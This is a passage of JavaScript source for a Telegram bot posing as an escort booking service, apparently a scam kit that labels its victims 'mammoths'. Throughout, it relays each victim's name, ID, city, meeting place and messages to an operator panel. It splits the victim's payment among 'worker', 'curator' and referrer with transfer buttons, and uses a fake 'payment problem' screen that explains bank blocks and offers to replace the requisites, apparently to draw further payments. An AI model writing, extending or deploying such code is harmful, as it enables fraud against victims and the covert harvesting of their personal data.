                            `├ Модель: ${models[userInfo.current_model].name}\n` +
                            `└ Цена: ${userInfo.current_model_price} RUB \n\n` +
                            `🤖 Информация о боте:\n` +
                            `├ Сервис: ESCORT\n` +
                            `└ Бот: @MeganModelsEscortBot`
                    })
                } else {
                    await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                        chat_id: workerId,
                        text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                            `├ Модель: ${models[userInfo.current_model].name}\n` +
                            `└ Цена: ${userInfo.current_model_price} RUB \n\n` +
                            `🤖 Информация о боте:\n` +
                            `├ Сервис: ESCORT\n` +
                            `└ Бот: @MeganModelsEscortBot`
                    })
                }
                if (added_curator) {
                    if (msg.from.username) {
                        if (user?.friend_invitation) {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: ${crypto_currency} \n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля воркера: ${(userInfo.current_model_price/100)*60} RUB\n` +
                                    `├ Доля реферала: ${(userInfo.current_model_price/100)*3} RUB\n` +
                                    `└ Доля куратора: ${(userInfo.current_model_price/100)*20} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести куратору', callback_data: `transfer_money_${userState.curator.id_user}` }],
                                        [{ text: '💲 Перевести рефералу', callback_data: `transfer_money_${user?.friend_invitation}` }],
                                    ]
                                }
                            })
                        } else {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: ${crypto_currency} \n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля воркера: ${(userInfo.current_model_price/100)*60} RUB\n` +
                                    `└ Доля куратора: ${(userInfo.current_model_price/100)*20} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести куратору', callback_data: `transfer_money_${userState.curator.id_user}` }],
                                    ]
                                }
                            })
                        }
                    } else {
                        if (user?.friend_invitation) {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: ${crypto_currency} \n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля воркера: ${(userInfo.current_model_price/100)*60} RUB\n` +
                                    `├ Доля реферала: ${(userInfo.current_model_price/100)*3} RUB\n` +
                                    `└ Доля куратора: ${(userInfo.current_model_price/100)*20} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести куратору', callback_data: `transfer_money_${userState.curator.id_user}` }],
                                        [{ text: '💲 Перевести рефералу', callback_data: `transfer_money_${user?.friend_invitation}` }],
                                    ]
                                }
                            })
                        } else {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: ${crypto_currency} \n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля воркера: ${(userInfo.current_model_price/100)*60} RUB\n` +
                                    `└ Доля куратора: ${(userInfo.current_model_price/100)*20} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести куратору', callback_data: `transfer_money_${userState.curator.id_user}` }],
                                    ]
                                }
                            })
                        }
                    }
                } else if (added_curator === false) {
                    if (msg.from.username) {
                        if (user?.friend_invitation) {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: ${crypto_currency} \n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля реферала: ${(userInfo.current_model_price/100)*3} RUB\n` +
                                    `└ Доля воркера: ${(userInfo.current_model_price/100)*80} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести рефералу', callback_data: `transfer_money_${user?.friend_invitation}` }],
                                    ]
                                }
                            })
                        } else {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: ${crypto_currency} \n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `└ Доля воркера: ${(userInfo.current_model_price/100)*80} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                    ]
                                }
                            })
                        }
                    } else {
                        if (user?.friend_invitation) {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: ${crypto_currency} \n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `├ Доля реферала: ${(userInfo.current_model_price/100)*3} RUB\n` +
                                    `└ Доля воркера: ${(userInfo.current_model_price/100)*80} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                        [{ text: '💲 Перевести рефералу', callback_data: `transfer_money_${user?.friend_invitation}` }],
                                    ]
                                }
                            })
                        } else {
                            await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                                chat_id: adminId,
                                text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) создал заявку на оформление модели\n` +
                                    `├ Модель: ${models[userInfo.current_model].name}\n` +
                                    `├ Воркер: @${user.user_name} (ID: ${user.id_user}) \n` +
                                    `├ Место встречи: ${userInfo.date_locate} \n` +
                                    `├ Оплата: ${crypto_currency} \n` +
                                    `├ Цена: ${userInfo.current_model_price} RUB \n` +
                                    `└ Доля воркера: ${(userInfo.current_model_price/100)*80} RUB\n\n` +
                                    `🤖 Информация о боте:\n` +
                                    `├ Сервис: ESCORT\n` +
                                    `└ Бот: @MeganModelsEscortBot`,
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '💲 Перевести воркеру', callback_data: `transfer_money_${user.id_user}` }],
                                    ]
                                }
                            })
                        }
                    }
                }
            } catch (e) {
                console.log(e)
            }
        } else if (msg.data === "payment_problem") {
            await bot.deleteMessage(chatId, msg.message.message_id);
            await bot.sendPhoto(chatId, "images/pay_method.jpg", {
                caption: '<b>📝 Проблема при оплате</b>\n\n' +
                    "Случаются ситуации, когда банки не дают провести перевод на реквизиты из-за большого количества поступлений денежных средств.\n\n" +
                    "Расскажите нам, что случилось у вас, чтобы мы заменили проблемные реквизиты.",
                parse_mode: 'HTML',
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{text: "Проверить оплату ✅", callback_data: "agree_card_rules"}],
                    ]
                })
            })
        }
    } catch (error) {
        if (error.response && error.response.status === 400 && error.response.data.description.includes("message to delete not found")) {
            console.log(`Message to delete not found: ${msg.message.message_id}`);
        } else {
            console.error(`Error handling callback query: ${error.message}`);
        }
    }
});

bot.on('callback_query', async (query) => {
    try {
        const { id, data } = query;

        if (data === 'pay_by_cash') {
            await bot.answerCallbackQuery(id, {
                text: 'Для возможности оплаты наличными у вас должна быть история заказов!',
                show_alert: true
            });        }
    } catch (error) {
        console.error('Error handling callback query:', error);
        if (error.message.includes('query is too old')) {
            await bot.answerCallbackQuery(query.id, 'Ошибка.');
        }
    }
});


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    console.log(userState[chatId]?.step, "message")
    if (userState[chatId]?.step === 'city') {
        userState[chatId].city = msg.text;
        const rightCity = await checkCity(msg.text);
        if (rightCity) {
            userInfo.city = msg.text
            const text_currency = "Выберите валюту:";
            await bot.sendMessage(chatId, `✅ Город ${msg.text} успешно установлен`);
            try {
                if (msg.from.username) {
                    await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                        chat_id: workerId,
                        text: `ℹ️Мамонт @${msg.from.username} (ID: ${msg.from.id}) выбрал город ${msg.text}\n\n` +
                            `🤖 Информация о боте:\n` +
                            `├ Сервис: ESCORT\n` +
                            `└ Бот: @MeganModelsEscortBot`
                    })
                } else {

                    await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                        chat_id: workerId,
                        text: `ℹ️Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) выбрал город ${msg.text}\n\n` +
                            `🤖 Информация о боте:\n` +
                            `├ Сервис: ESCORT\n` +
                            `└ Бот: @MeganModelsEscortBot`
                    })
                }
            } catch (e) {
                console.log(e)
            }
            await bot.sendMessage(chatId, text_currency, {parse_mode: 'HTML', ...AllButtons.currency_button});
            userState[chatId].step = 'currency';
        } else {
            await bot.sendMessage(chatId, "<b>Город не найден!</b> Введите существующий населенный пункт: ", {parse_mode: 'HTML'});
            userState[chatId].step = 'city';
        }
    } else if (userState[chatId]?.step_add === 'city_change') {
        userInfo.city = msg.text
        let rightCity = await checkCity(msg.text);
        if (rightCity) {
            const user = await UserSchema.updateOne({user_id: msg.from.id}, {$set: {
                    city: msg.text,
                    city_change: true
                }});
            await bot.sendMessage(chatId, `✅ Город ${msg.text} успешно установлен`, {parse_mode: 'HTML', ...AllButtons.city_change_buttons_complete});
            userState[chatId].step = 'main_manu';
            userState[chatId].step_add = '';
        } else  {
            await  bot.sendMessage(chatId, "<b>Город не найден!</b> Введите существующий населенный пункт: ", { parse_mode: 'HTML'});
            userState[chatId].step = 'main_manu';
        }
    } else if (userState[chatId]?.step === 'locate_of_date') {
        userInfo.date_locate = msg.text;
        await bot.sendPhoto(chatId, "images/pay_method.jpg", {
            caption: "<b>Выберите удобный для вас метод оплаты:</b>",
            parse_mode: 'HTML',
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [{text: "💵 Оплатить наличными", callback_data: "pay_by_cash"}],
                    [{text: "💳 Оплатить банковськой картой", callback_data: "pay_by_card"}],
                    [{text: "🪙 Оплатить криптовалютой", callback_data: "pay_by_crypto"}],
                ]
            })
        })
    } else if (userState[chatId]?.step === 'send_letter') {
        const models = await ModelSchema.find()
        const adminUser = await workerUser.findOne({id_user: workerId})
        if (adminUser?.escort_model.length > 0) {
            adminUser.escort_model.forEach(item => {
                models.unshift(item)
            })
        }
        try {
            if (msg.from.username) {
                await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                    chat_id: workerId,
                    text: `ℹ️ Мамонт @${msg.from.username} (ID: ${msg.from.id}) отправил сообщение\n` +
                        `├ Модель: ${models[userInfo.current_model].name}\n` +
                        `└ Сообщение: ${msg.text} \n\n` +
                        `🤖 Информация о боте:\n` +
                        `├ Сервис: ESCORT\n` +
                        `└ Бот: @MeganModelsEscortBot`
                })
            } else {
                await axios.post(`https://api.telegram.org/bot${workPanelToken}/sendMessage`, {
                    chat_id: workerId,
                    text: `ℹ️ Мамонт ${msg.from.first_name} (ID: ${msg.from.id}) отправил сообщение\n` +
                        `├ Модель: ${models[userInfo.current_model].name}\n` +
                        `└ Сообщение: ${msg.text} \n\n` +
                        `🤖 Информация о боте:\n` +
                        `├ Сервис: ESCORT\n` +
                        `└ Бот: @MeganModelsEscortBot`
                })
            }
        } catch (e) {

        }
        await bot.sendMessage(chatId, "Сообщение отправлено ✅", {parse_mode: 'HTML', reply_markup: JSON.stringify({
                inline_keyboard: [
                    [{text: "↩ Вернуться", callback_data: "models"}],
                ]
        })});
        userState[chatId] = {
            step: "main_menu"
        }

    }


});